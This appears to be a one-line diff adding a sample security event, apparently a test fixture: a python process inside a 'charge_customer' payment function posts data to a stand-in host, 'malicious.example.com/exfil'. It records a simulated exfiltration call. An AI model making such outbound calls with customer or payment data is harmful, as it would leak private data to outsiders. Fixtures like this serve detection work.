@@ -1,0 +1,1 @@
+event=network process=python stack=worker_loop>app:charge_customer>requests.post target=https://malicious.example.com/exfil
